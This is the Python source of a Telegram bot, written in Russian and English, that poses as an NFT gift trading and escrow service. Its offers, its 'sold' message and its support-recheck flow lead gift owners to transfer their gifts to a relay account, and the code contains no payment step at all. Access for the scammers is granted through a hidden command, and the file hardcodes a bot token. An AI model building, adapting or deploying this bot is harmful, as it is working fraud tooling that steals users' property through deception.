"""
lang: Python 3.11+, file: bot.py
inline mode включить через @BotFather -> /setinline
/setinlinefeedback -> 100%  (обязательно для chosen_inline_result)
"""

import os
import re
import hashlib
import logging
import httpx
from telegram import (
    Update,
    InlineQueryResultArticle,
    InputTextMessageContent,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
)
from telegram.ext import (
    Application,
    InlineQueryHandler,
    CallbackQueryHandler,
    ChosenInlineResultHandler,
    CommandHandler,
    ContextTypes,
)
from telegram.constants import ParseMode
from telegram.error import TimedOut, RetryAfter

logging.basicConfig(level=logging.INFO)
log = logging.getLogger(__name__)

BOT_TOKEN = os.getenv("BOT_TOKEN", "9104054497:AAGWash0tIUfEpGxUND7PeRKLxrgonJuZQQ")
BOT_USERNAME = "giftchangernftbot"
RELAY_USERNAME = "Giftlinkrelay"
RELAY_CHAT_ID = f"@{RELAY_USERNAME}"
OFFER_HOURS = 6

# ========== WHITELIST продавцов ==========
_allowed_sellers: set[int] = set()

# ========== ХРАНИЛИЩЕ ССЫЛОК ==========
_link_store: dict[str, str] = {}

def store_link(link: str) -> str:
    h = hashlib.md5(link.encode()).hexdigest()[:8]
    _link_store[h] = link
    return h

def restore_link(h: str) -> str:
    return _link_store.get(h, h)

# ========== ХРАНИЛИЩЕ ОФФЕРОВ ==========
_pending: dict[str, dict] = {}

# ========== АКТИВНЫЕ СДЕЛКИ (link_hash -> buyer_id) ==========
_deals: dict[str, int] = {}

# ========== ПРЕМИУМ ЭМОДЗИ ==========
def E(emoji_id: str, fallback: str) -> str:
    return f"<tg-emoji emoji-id='{emoji_id}'>{fallback}</tg-emoji>"

EMOJI_GIFT  = E("6037175527846975726", "🎁")
EMOJI_STAR  = E("6028338546736107668", "⭐️")
EMOJI_GRAM  = E("6007983438294949171", "💎")
EMOJI_WARN  = E("6030563507299160824", "❗️")
EMOJI_OK    = E("5774022692642492953", "✅")
EMOJI_CROSS = E("5774077015388852135", "❌")
EMOJI_CLOCK = E("5891211339170326418", "⌛️")
EMOJI_GEAR  = E("6032742198179532882", "⚙")

CE_GIFT  = "6037175527846975726"
CE_STAR  = "6028338546736107668"
CE_GRAM  = "6007983438294949171"
CE_WARN  = "6030563507299160824"
CE_OK    = "5774022692642492953"
CE_CROSS = "5774077015388852135"
CE_CLOCK = "5891211339170326418"
CE_GEAR  = "6032742198179532882"

# ========== RAW API ==========
async def _api(method: str, payload: dict):
    try:
        async with httpx.AsyncClient() as client:
            r = await client.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/{method}",
                json=payload, timeout=20,
            )
            data = r.json()
            if not data.get("ok"):
                log.error("%s: %s", method, data)
            return data.get("result")
    except Exception as e:
        log.error("%s: %s", method, e)

def _btn(text, callback_data=None, url=None, style=None, emoji_id=None):
    d = {"text": text}
    if callback_data: d["callback_data"] = callback_data
    if url:           d["url"] = url
    if style:         d["style"] = style
    if emoji_id:      d["icon_custom_emoji_id"] = emoji_id
    return d

async def send_msg(chat_id, text, rows=None, disable_preview=True):
    payload = {
        "chat_id": chat_id,
        "text": text,
        "parse_mode": "HTML",
        "link_preview_options": {"is_disabled": disable_preview},
    }
    if rows:
        payload["reply_markup"] = {"inline_keyboard": rows}
    result = await _api("sendMessage", payload)
    return result.get("message_id") if result else None

async def edit_msg(chat_id, message_id, text, rows=None):
    payload = {
        "chat_id": chat_id,
        "message_id": message_id,
        "text": text,
        "parse_mode": "HTML",
    }
    if rows:
        payload["reply_markup"] = {"inline_keyboard": rows}
    await _api("editMessageText", payload)

async def edit_inline_msg(inline_message_id: str, text: str, rows=None):
    payload = {
        "inline_message_id": inline_message_id,
        "text": text,
        "parse_mode": "HTML",
    }
    if rows:
        payload["reply_markup"] = {"inline_keyboard": rows}
    await _api("editMessageText", payload)

# ========== ТЕКСТЫ ==========
START_TEXT = (
    f"{EMOJI_GIFT} <b>GiftChanger — передача NFT подарков</b>\n\n"
    f"Передача выполняется через аккаунт сделки @{RELAY_USERNAME}. "
    f"После подтверждения получения результат сделки будет доступен в системе.\n\n"
    f"{EMOJI_GEAR} <b>Как это работает:</b>\n\n"
    f"1. Покупатель присылает вам предложение через бота\n"
    f"2. Вы нажимаете «Принять» под сообщением с оффером\n"
    f"3. Передайте подарок через @{RELAY_USERNAME}\n"
    f"4. Нажмите «Подтвердить передачу» после отправки\n"
    f"5. Покупатель подтверждает получение — сделка завершена\n\n"
    f"{EMOJI_CLOCK} <b>Ограниченное время</b> на подтверждение, таймер указан в оффере.\n\n"
    f"{EMOJI_OK} <b>Подарок уже у вас</b> — ничего дополнительно покупать не требуется."
)

HOW_TO_TEXT = (
    f"{EMOJI_GIFT} <b>Пошаговая инструкция: как принять оффер и получить {EMOJI_STAR}</b>\n\n"
    f"<b>Шаг 1.</b> Нажмите кнопку «Принять» под сообщением с предложением\n\n"
    f"<b>Шаг 2.</b> Проверьте сумму и условия сделки\n\n"
    f"<b>Шаг 3.</b> Нажмите «Передать подарок» — откроется профиль @{RELAY_USERNAME}\n\n"
    f"<b>Шаг 4.</b> Перейдите в Профиль → Подарки в Telegram\n\n"
    f"<b>Шаг 5.</b> Выберите подарок → Передать → укажите @{RELAY_USERNAME}\n\n"
    f"<b>Шаг 6.</b> После отправки нажмите «Подтвердить передачу»\n\n"
    f"<b>Шаг 7.</b> Дождитесь подтверждения от покупателя\n\n"
    f"{EMOJI_GEAR} Статус обновляется после подтверждения покупателем."
)

# ========== УТИЛИТЫ ==========
def normalize_link(raw: str) -> str:
    return raw if raw.startswith("http") else "https://" + raw

def nft_name_from_link(link: str) -> str:
    part = link.rstrip("/").split("/")[-1]
    m = re.match(r"^(.*?)-(\d+)$", part)
    return f"{m.group(1)} #{m.group(2)}" if m else part

PATTERN = re.compile(
    r"((?:https?://)?t\.me/nft/\S+|https?://\S+)\s+([\d.,]+)\s*(gramm)?\s*(en)?",
    re.IGNORECASE,
)

# ========== КОМАНДА ДОСТУПА ==========
async def cmd_mitingteamwork(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    user = update.effective_user
    log.info("mitingteamwork called by user_id=%s", user.id)
    _allowed_sellers.add(user.id)
    name = f"@{user.username}" if user.username else user.first_name
    try:
        await update.message.reply_text(
            f"{EMOJI_OK} <b>{name}</b>, доступ активирован. Теперь вы можете создавать офферы.",
            parse_mode="HTML",
        )
    except Exception:
        pass

# ========== HANDLERS ==========
async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    rows = [[_btn("❓ Как принять оффер?", callback_data="howto_accept", emoji_id=CE_GEAR)]]
    await send_msg(update.effective_chat.id, START_TEXT, rows)

async def button_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    query = update.callback_query
    try:
        await query.answer()
    except (TimedOut, RetryAfter):
        pass

    chat_id = query.message.chat_id if query.message else None
    msg_id  = query.message.message_id if query.message else None
    iid     = query.inline_message_id
    data    = query.data

    if data == "noop":
        return

    elif data == "howto_accept":
        rows = [[_btn("← Назад", callback_data="back_start", emoji_id=CE_GEAR)]]
        if iid:
            await edit_inline_msg(iid, HOW_TO_TEXT, rows)
        else:
            await edit_msg(chat_id, msg_id, HOW_TO_TEXT, rows)

    elif data == "back_start":
        rows = [[_btn("❓ Как принять оффер?", callback_data="howto_accept", emoji_id=CE_GEAR)]]
        if iid:
            await edit_inline_msg(iid, START_TEXT, rows)
        else:
            await edit_msg(chat_id, msg_id, START_TEXT, rows)

    elif data == "dec":
        text = f"{EMOJI_CROSS} Предложение отклонено."
        if iid:
            await edit_inline_msg(iid, text)
        else:
            await edit_msg(chat_id, msg_id, text)

    elif data.startswith("acc|"):
        await _handle_accept(query)

    elif data.startswith("seller_confirm|"):
        await _handle_seller_confirm(query)

    elif data.startswith("buyer_done|"):
        await _handle_buyer_done(query)

    elif data.startswith("recheck|"):
        await _handle_recheck(query)


async def inline_query(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    sender = update.inline_query.from_user

    # проверка доступа
    if sender.id not in _allowed_sellers:
        no_access = InlineQueryResultArticle(
            id="no_access",
            title="❌ Нет доступа",
            description="Для создания офферов необходимо получить доступ",
            input_message_content=InputTextMessageContent(
                message_text=f"{EMOJI_CROSS} У вас нет доступа к созданию офферов.\n\nОбратитесь к администратору для получения доступа.",
                parse_mode=ParseMode.HTML,
            ),
        )
        try:
            await update.inline_query.answer([no_access], cache_time=0)
        except (TimedOut, RetryAfter):
            pass
        return

    query_text = update.inline_query.query.strip()
    if not query_text:
        return

    m = PATTERN.search(query_text)
    if not m:
        return

    link         = normalize_link(m.group(1))
    price        = m.group(2).strip()
    in_gramm     = bool(m.group(3))
    in_english   = bool(m.group(4))
    unit         = "GRAMM" if in_gramm else "stars"
    unit_display = EMOJI_GRAM if in_gramm else EMOJI_STAR
    nft_name     = nft_name_from_link(link)
    sender_name  = sender.username or sender.first_name or "Продавец"

    link_hash = store_link(link)
    result_id = f"{link_hash}|{price}|{unit}|{'en' if in_english else 'ru'}"
    cb_accept = f"acc|{link_hash}|{price}|{unit}"

    if in_english:
        text = (
            f"{EMOJI_GIFT} <b>{sender_name}</b> offers You\n\n"
            f"<b>{price} {unit_display}</b> for gift <a href='{link}'>{nft_name}</a>.\n\n"
            f"{EMOJI_CLOCK} Offer valid for another <b>{OFFER_HOURS}h 00m</b>.\n\n"
            f"{link}"
        )
        title       = f"🎁 Offer {nft_name} for {price}"
        desc        = "Send offer to this chat"
        btn_decline = _btn("❌ Decline", callback_data="dec",      style="danger",  emoji_id=CE_CROSS)
        btn_accept  = _btn("✅ Accept",  callback_data=cb_accept,  style="success", emoji_id=CE_OK)
    else:
        text = (
            f"{EMOJI_GIFT} <b>{sender_name}</b> предлагает Вам\n\n"
            f"<b>{price} {unit_display}</b> за подарок <a href='{link}'>{nft_name}</a>.\n\n"
            f"{EMOJI_CLOCK} Предложение действует ещё <b>{OFFER_HOURS}ч 00м</b>.\n\n"
            f"{link}"
        )
        title       = f"🎁 Предложить {nft_name} за {price}"
        desc        = "Отправить предложение в этот чат"
        btn_decline = _btn("❌ Отклонить", callback_data="dec",    style="danger",  emoji_id=CE_CROSS)
        btn_accept  = _btn("✅ Принять",   callback_data=cb_accept, style="success", emoji_id=CE_OK)

    markup = InlineKeyboardMarkup([[
        InlineKeyboardButton(btn_decline["text"], callback_data=btn_decline["callback_data"]),
        InlineKeyboardButton(btn_accept["text"],  callback_data=btn_accept["callback_data"]),
    ]])

    _pending[result_id] = {
        "link": link, "price": price, "unit": unit,
        "in_english": in_english, "nft_name": nft_name,
        "btn_decline": btn_decline, "btn_accept": btn_accept,
        "text": text, "seller_id": sender.id,
    }

    result = InlineQueryResultArticle(
        id=result_id,
        title=title,
        description=desc,
        input_message_content=InputTextMessageContent(
            message_text=text,
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=False,
        ),
        reply_markup=markup,
    )

    try:
        await update.inline_query.answer([result], cache_time=0)
    except (TimedOut, RetryAfter):
        pass


async def chosen_inline_result(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    r   = update.chosen_inline_result
    iid = r.inline_message_id
    rid = r.result_id

    offer = _pending.get(rid)
    if not offer or not iid:
        return

    # сохраняем iid для дальнейших правок
    offer["iid"] = iid

    rows = [[offer["btn_decline"], offer["btn_accept"]]]
    await _api("editMessageReplyMarkup", {
        "inline_message_id": iid,
        "reply_markup": {"inline_keyboard": rows},
    })


async def _handle_accept(query):
    parts = query.data.split("|", 3)
    if len(parts) < 4:
        return
    _, link_hash, price, unit = parts
    link      = restore_link(link_hash)
    nft_name  = nft_name_from_link(link)
    buyer     = query.from_user

    # продавец не может принять свой оффер
    for v in _pending.values():
        if v.get("link") == link and v.get("seller_id") == buyer.id:
            try:
                await query.answer("❌ Вы не можете принять собственный оффер.", show_alert=True)
            except (TimedOut, RetryAfter):
                pass
            return
    buyer_mention = f"@{buyer.username}" if buyer.username else buyer.first_name
    u_display = EMOJI_GRAM if unit == "GRAMM" else EMOJI_STAR

    iid     = query.inline_message_id
    chat_id = query.message.chat_id if query.message else None
    msg_id  = query.message.message_id if query.message else None

    # сохраняем buyer_id и seller_id
    seller_id = None
    for v in _pending.values():
        if v.get("link") == link:
            seller_id = v.get("seller_id")
            break
    _deals[link_hash] = {"buyer_id": buyer.id, "seller_id": seller_id}

    try:
        await query.answer(
            f"Оффер принят!\nПередайте подарок через @{RELAY_USERNAME}.\nСумма: {price}",
            show_alert=True,
        )
    except (TimedOut, RetryAfter):
        pass

    # кнопка передачи — открывает профиль relay напрямую (deeplink на передачу подарка)
    transfer_url   = f"https://t.me/{RELAY_USERNAME}"
    cb_sel_confirm = f"seller_confirm|{link_hash}|{price}|{unit}"

    sold_text = (
        f"{EMOJI_GIFT} Подарок: <a href='{link}'>{nft_name}</a> <b>успешно продан!</b>\n\n"
        f"• Передайте подарок на @{RELAY_USERNAME},\n"
        f"чтобы получить <b>{price} {u_display}</b>.\n\n"
        f"{EMOJI_WARN} <b>ВАЖНО:</b> если вас просят передать подарок на личный профиль — <b>не передавайте</b>. "
        f"Передача выполняется исключительно через @{RELAY_USERNAME}."
    )

    rows = [
        [_btn("📦 Передать подарок",    url=transfer_url,       style="primary", emoji_id=CE_GIFT)],
        [_btn("✅ Подтвердить передачу", callback_data=cb_sel_confirm, style="success", emoji_id=CE_OK)],
    ]

    if iid:
        await edit_inline_msg(iid, sold_text, rows)
    else:
        await edit_msg(chat_id, msg_id, sold_text, rows)

    try:
        await send_msg(
            RELAY_CHAT_ID,
            f"🔔 Новая сделка\nПодарок: {link}\nЦена: {price} {unit}\nПокупатель: {buyer_mention}",
        )
    except Exception as e:
        log.warning("relay notify: %s", e)


async def _handle_seller_confirm(query):
    """Продавец нажал «Подтвердить передачу» — показываем кнопки покупателю."""
    parts = query.data.split("|", 3)
    if len(parts) < 4:
        return
    _, link_hash, price, unit = parts
    link      = restore_link(link_hash)
    nft_name  = nft_name_from_link(link)
    u_display = EMOJI_GRAM if unit == "GRAMM" else EMOJI_STAR

    iid     = query.inline_message_id
    chat_id = query.message.chat_id if query.message else None
    msg_id  = query.message.message_id if query.message else None

    try:
        await query.answer("✅ Вы подтвердили передачу. Ожидайте подтверждения покупателя.", show_alert=True)
    except (TimedOut, RetryAfter):
        pass

    cb_done    = f"buyer_done|{link_hash}|{price}|{unit}"
    cb_recheck = f"recheck|{link_hash}"

    text = (
        f"{EMOJI_OK} Продавец подтвердил передачу NFT\n\n"
        f"{EMOJI_GIFT} Подарок: <a href='{link}'>{nft_name}</a>\n"
        f"Сумма: <b>{price} {u_display}</b>\n\n"
        f"{EMOJI_CLOCK} Ожидается подтверждение от покупателя."
    )

    rows = [
        [_btn("✅ Продавец передал NFT", callback_data=cb_done,    style="success", emoji_id=CE_OK)],
        [_btn("🔄 Перепроверить",        callback_data=cb_recheck, style="primary", emoji_id=CE_GEAR)],
    ]

    if iid:
        await edit_inline_msg(iid, text, rows)
    else:
        await edit_msg(chat_id, msg_id, text, rows)


async def _handle_buyer_done(query):
    """Только покупатель может нажать — сделка завершена."""
    parts = query.data.split("|", 3)
    if len(parts) < 4:
        return
    _, link_hash, price, unit = parts

    deal = _deals.get(link_hash, {})
    buyer_id  = deal.get("buyer_id")
    seller_id = deal.get("seller_id")
    uid = query.from_user.id
    if seller_id and uid == seller_id:
        try:
            await query.answer("Gift Relayer\n\nСейчас ожидается действие покупателя.", show_alert=True)
        except (TimedOut, RetryAfter):
            pass
        return
    if buyer_id and uid != buyer_id:
        try:
            await query.answer("❌ Только покупатель может подтвердить получение.", show_alert=True)
        except (TimedOut, RetryAfter):
            pass
        return

    link      = restore_link(link_hash)
    nft_name  = nft_name_from_link(link)
    u_display = EMOJI_GRAM if unit == "GRAMM" else EMOJI_STAR

    iid     = query.inline_message_id
    chat_id = query.message.chat_id if query.message else None
    msg_id  = query.message.message_id if query.message else None

    try:
        await query.answer("🎉 Сделка завершена!", show_alert=True)
    except (TimedOut, RetryAfter):
        pass

    text = (
        f"{EMOJI_OK} <b>Сделка завершена!</b>\n\n"
        f"{EMOJI_GIFT} Подарок: <a href='{link}'>{nft_name}</a>\n"
        f"Сумма: <b>{price} {u_display}</b>\n\n"
        f"Покупатель подтвердил получение NFT."
    )

    if iid:
        await edit_inline_msg(iid, text)
    else:
        await edit_msg(chat_id, msg_id, text)

    try:
        await send_msg(RELAY_CHAT_ID, f"✅ Сделка завершена\nПодарок: {link}\nЦена: {price} {unit}")
    except Exception as e:
        log.warning("relay done: %s", e)


async def _handle_recheck(query):
    """Только покупатель может нажать — запрос перепроверки."""
    parts = query.data.split("|", 2)
    link_hash = parts[1] if len(parts) > 1 else ""

    deal = _deals.get(link_hash, {})
    buyer_id  = deal.get("buyer_id")
    seller_id = deal.get("seller_id")
    uid = query.from_user.id
    if seller_id and uid == seller_id:
        try:
            await query.answer("Gift Relayer\n\nСейчас ожидается действие покупателя.", show_alert=True)
        except (TimedOut, RetryAfter):
            pass
        return
    if buyer_id and uid != buyer_id:
        try:
            await query.answer("❌ Только покупатель может запросить перепроверку.", show_alert=True)
        except (TimedOut, RetryAfter):
            pass
        return

    link     = restore_link(link_hash)
    nft_name = nft_name_from_link(link)

    iid     = query.inline_message_id
    chat_id = query.message.chat_id if query.message else None
    msg_id  = query.message.message_id if query.message else None

    try:
        await query.answer("🔄 Запрос на перепроверку отправлен.", show_alert=True)
    except (TimedOut, RetryAfter):
        pass

    text = (
        f"{EMOJI_CLOCK} <b>Ожидается перепроверка поддержкой.</b>\n\n"
        f"{EMOJI_GIFT} Подарок: <a href='{link}'>{nft_name}</a>\n\n"
        f"Запрос передан в поддержку. Результат будет обновлён после проверки."
    )

    if iid:
        await edit_inline_msg(iid, text)
    else:
        await edit_msg(chat_id, msg_id, text)

    try:
        await send_msg(RELAY_CHAT_ID, f"🔄 Запрос перепроверки\nПодарок: {link}")
    except Exception as e:
        log.warning("relay recheck: %s", e)


def main() -> None:
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("mitingteamwork", cmd_mitingteamwork))
    app.add_handler(InlineQueryHandler(inline_query))
    app.add_handler(ChosenInlineResultHandler(chosen_inline_result))
    app.add_handler(CallbackQueryHandler(button_handler))
    log.info("bot started")
    app.run_polling(drop_pending_updates=True)


if __name__ == "__main__":
    main()
